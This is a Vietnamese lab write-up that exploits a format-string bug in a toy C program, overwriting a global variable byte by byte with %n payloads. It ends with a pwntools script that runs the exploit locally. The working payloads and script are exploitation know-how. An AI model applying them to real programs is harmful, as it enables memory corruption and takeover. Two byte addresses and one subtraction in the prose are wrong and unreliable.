# *Lab 04 Format String*


Code C:

```c
#include <stdio.h>
int a = 123, b = 456;
int main() {
	int c = 789;
	char s[100];
	printf("%p\n", &c);
	scanf("%s", s);
	printf(s);
	if (c == 16) {
		puts("modified c.");
	} else if (a == 2) {
		puts("modified a for a small number.");
	} else if (b == 0x12345678) {
		puts("modified b for a big number!");
	}
	return 0;
}

```

Mục đích cuối của chúng ta là ghi đề biến global `b` thành `0x12345678`

## Attack

Do giá trị muốn ghi đề quá lớn nên ta không thể ghi đè trực tiếp bằng cách chèn format string vô trước đối số được `%overwtitex`. Cho nên hướng giải quyết sẽ là ghi đè từng bytes.

Cụ thể là địa chỉ của biến `b` sẽ là `0x0804C028`như vậy ta sẽ ghi đè từng bytes như sau (little edian):

- 0x0804C028 sẽ được ghi đè 0x78
- 0x0804C029 sẽ được ghi đề 0x56
- 0x0804C030 sẽ được ghi đè 0x34
- 0x0804C031 sẽ được ghi đè 0x12


## Solve

Ta tiến hành ghi lần lượt từng bytes với payload như sau:

`p32(0x0804C028)p32(0x0804C029)p32(0x0804C030)p32(0x0804C031)%ax%6$n%bx%7$n%cx%8$n%dx%9$n`

với `a,b,c,d` sẽ là giá trị để ghi đè lần lượt 4 bytes `0x78,0x56,0x34,0x12`

và `6,7,8,9` đi với `%n` là để xác định đối số truyền vào cho lần lượt 4 bytes


### Tính giá trị `a,b,c,d`

Giá trị của `a` sẽ có giá trị của `0x78 - 16 = 140`, do ở đầu payload đã có 16 bytes của 4 địa chỉ truyền vào làm đối số:

Những vị trí chưa ghi đè ta sẽ để là `10`
payload: `p32(0x0804C028)p32(0x0804C029)p32(0x0804C030)p32(0x0804C031)%104x%6$n%10x%7$n%10x%8$n%10x%9$n`

Kết quả: 

![image](https://user-images.githubusercontent.com/31529599/143366126-969a0953-ccd7-4eb6-ad12-e9ee366d5664.png)

Ta thấy bytes đầu tiên đã được ghi thành công thành `0x78`

Từ giá trị ở trên ta thấy rằng giá trị của phần tử tiếp theo đã được ghi đè lớn hơn 0x78 (thành 0x82) và không thể nào giảm `b` xuống để bằng 0x56 được nên ta sẽ thực hiện overflow thành `0x156` thì khi ghi 1 byte vào thì sẽ là `0x56` và bytes `1` sẽ được tràn vào vị trí bytes tiếp theo

`b = 0x156-0x82+10 = 222`

payload: `p32(0x0804C028)p32(0x0804C029)p32(0x0804C030)p32(0x0804C031)%104x%6$n%222x%7$n%10x%8$n%10x%9$n`

Kết quả: 

![image](https://user-images.githubusercontent.com/31529599/143366366-697e8251-6aa7-461d-b0e0-b9288900bfbf.png)


Tương tự tính cho byte thứ 3 và thứ 4:

`c = 222`
`d = 222`

Ta có payload cuối cùng sẽ là: `p32(0x0804C028)p32(0x0804C029)p32(0x0804C030)p32(0x0804C031)%104x%6$n%222x%7$n%222x%8$n%222x%9$n`

Kết quả:

![image](https://user-images.githubusercontent.com/31529599/143366593-7444eed0-089f-45f5-a4b3-0de8b8eb4198.png)


### Chạy script

Script python:

```python
from pwn import *

sh = process('./lab')
c_addr = int(sh.recvuntil('\n', drop=True), 16)
print (hex(c_addr))
a = 0x0804C028
payload =   p32(a)+p32(a+1) +p32(a+2) + p32(a+3) +b'%104x%6$n%222x%7$n%222x%8$n%222x%9$n'
f = open('payload.txt','wb')
f.write(payload)
f.close()
print (payload)
sh.sendline(payload)
print (sh.recv())
sh.interactive()

```


Kết quả:

![image](https://user-images.githubusercontent.com/31529599/143366671-a56084aa-99b1-441a-9a99-615536d6f1be.png)
